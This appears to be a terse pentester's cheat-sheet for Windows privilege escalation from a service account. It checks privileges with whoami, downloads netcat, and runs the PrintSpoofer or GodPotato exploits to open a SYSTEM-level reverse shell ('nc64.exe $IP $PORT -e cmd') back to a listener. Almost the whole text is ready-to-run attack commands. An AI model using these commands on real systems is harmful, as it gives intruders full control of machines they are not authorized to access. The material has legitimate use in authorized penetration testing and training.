
Confirm  Piv
```sh
whoami /all
```

Tools we can  use 

 - PrintSpoofer
 - GodPotato


```sh
nc -lvnp 5555

iwr -uri "https://github.com/int0x33/nc.exe/blob/master/nc64.exe/" -Outfile nc64.exe

```

download the exploit method 1
```sh
https://github.com/itm4n/PrintSpoofer/releases
```

execute exploit
```sh
PrintSpoofer64.exe -c "C:\TEMP\ncat.exe $IP  $PORT -e cmd"
```



download the exploit method 2
```sh
https://github.com/BeichenDream/GodPotato/releases
```

execute
```sh
#ne35 depends on the .net version
.\GodPotato-NET35.exe -cmd "C:\TEMP\nc64.exe $IP $PORT -e cmd "
```

